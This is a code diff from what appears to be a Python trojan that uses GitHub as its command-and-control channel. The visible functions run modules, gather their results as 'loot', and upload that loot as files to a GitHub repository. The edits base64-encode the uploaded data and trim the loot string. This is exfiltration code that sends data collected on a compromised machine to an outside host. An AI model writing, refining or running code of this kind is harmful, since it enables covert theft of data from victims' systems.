@@ -120,7 +120,7 @@ def ReadFile(dir):
 def RunModule(module, args, flags):
     print("Running module: %s" % module)
     result = sys.modules[module].run(args, flags)
-    StoreLoot("\n" + module + ": " + result + "\n")
+    StoreLoot("\n" + module + ": " + result)
     return
         
 def ConnectToGithub():
@@ -187,7 +187,7 @@ def StoreLoot(loot):
     #remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
     #repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
     #repo.create_file( remote_path, "testing...", base64.b64encode(loot.encode("utf-8")) )
-    repo.create_file( remote_path, "testing...", loot.encode("utf-8") )
+    repo.create_file( remote_path, "testing...", base64.b64encode(loot.encode("utf-8")) )
     LOOT_NUM += 1
 
     return
